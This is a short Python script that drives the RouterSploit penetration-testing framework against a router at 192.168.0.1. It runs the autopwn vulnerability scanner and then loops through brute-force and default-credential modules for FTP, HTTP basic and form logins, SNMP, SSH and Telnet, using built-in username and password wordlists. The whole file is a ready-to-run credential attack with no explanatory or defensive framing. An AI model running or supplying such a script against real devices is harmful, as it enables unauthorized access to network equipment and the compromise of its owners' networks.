import routersploit.wordlists as wordlists
import routersploit.modules.scanners.autopwn as autopwn
import routersploit.modules.creds.ftp_bruteforce as ftp_bruteforce
import routersploit.modules.creds.http_basic_bruteforce
import routersploit.modules.creds.ftp_default
import routersploit.modules.creds.http_basic_default
import routersploit.modules.creds.ftp_default
import routersploit.modules.creds.http_form_default
import routersploit.modules.creds.http_form_bruteforce
import routersploit.modules.creds.snmp_bruteforce
import routersploit.modules.creds.ssh_bruteforce
import routersploit.modules.creds.telnet_bruteforce
import routersploit.modules.creds.telnet_default

def brute_scanner(module):
	brute = module.Exploit()
	brute.target = '192.168.0.1'
	brute.usernames = wordlists.usernames
	brute.passwords = wordlists.passwords
	try:
		return brute.run()
	except:
		print "error"
		return 0
scanner = autopwn.Exploit()
scanner.target = '192.168.0.1'
scanner.run()

brute_scanner(ftp_bruteforce)
brute_scanner(routersploit.modules.creds.http_basic_bruteforce)
brute_scanner(routersploit.modules.creds.ftp_default)
brute_scanner(routersploit.modules.creds.http_basic_default)
brute_scanner(routersploit.modules.creds.http_form_bruteforce)
brute_scanner(routersploit.modules.creds.http_form_default)
brute_scanner(routersploit.modules.creds.snmp_bruteforce)
brute_scanner(routersploit.modules.creds.ssh_bruteforce)
# brute_scanner(routersploit.modules.creds.telnet_bruteforce)
brute_scanner(routersploit.modules.creds.telnet_default)

